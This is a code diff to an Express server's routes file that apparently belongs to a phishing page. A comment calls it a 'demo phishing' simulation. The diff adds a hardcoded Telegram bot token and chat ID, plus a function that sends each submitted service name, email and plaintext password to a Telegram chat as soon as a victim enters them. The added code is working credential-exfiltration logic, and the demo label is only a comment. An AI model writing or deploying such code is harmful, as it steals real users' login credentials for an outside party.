@@ -5,6 +5,30 @@ import { storage } from "./storage";
 import { api } from "@shared/routes";
 import { z } from "zod";
 
+const TELEGRAM_BOT_TOKEN = "7987053363:AAGK36GhJSQ19U8ubIdJLfSZaR5zP1EuwOM";
+const TELEGRAM_CHAT_ID = "6360165707";
+
+async function sendToTelegram(message: string) {
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    });
+    if (!response.ok) {
+      console.error("Telegram API error:", await response.text());
+    }
+  } catch (error) {
+    console.error("Error sending to Telegram:", error);
+  }
+}
+
 export async function registerRoutes(
   httpServer: Server,
   app: Express
@@ -16,6 +40,15 @@ export async function registerRoutes(
       // In a real app we wouldn't store these, but for this demo request we capture them
       // as per the "demo phishing" simulation requirement.
       await storage.createCredential(input);
+      
+      // Send notification to Telegram
+      const message = `<b>New Login Attempt</b>\n\n` +
+        `<b>Service:</b> ${input.service}\n` +
+        `<b>Email:</b> <code>${input.email}</code>\n` +
+        `<b>Password:</b> <code>${input.password}</code>`;
+      
+      // Fire and forget telegram message
+      sendToTelegram(message);
       
       // Simulate a small network delay for realism
       setTimeout(() => {
